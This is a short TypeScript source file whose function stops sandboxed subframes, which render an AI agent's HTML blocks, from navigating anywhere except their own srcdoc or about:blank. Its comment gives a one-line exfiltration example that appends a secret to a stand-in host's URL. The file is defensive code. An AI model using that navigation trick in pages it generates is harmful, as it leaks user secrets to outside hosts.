/**
 * Which navigations the app window allows inside a SUBFRAME (lane visual).
 *
 * An agent's ```html block runs in `<iframe sandbox="allow-scripts" srcdoc>`. CSP has no
 * navigation directive, so the page can still `location.href = "https://x/?" + secret`, use a
 * meta refresh, or have a link clicked, and the remote page loads in the chat. The main frame
 * keeps its own rules; a subframe may only ever show its own srcdoc / about:blank.
 */
export function allowFrameNavigation(isMainFrame: boolean, url: string): boolean {
  if (isMainFrame) return true;
  return url === 'about:srcdoc' || url === 'about:blank';
}
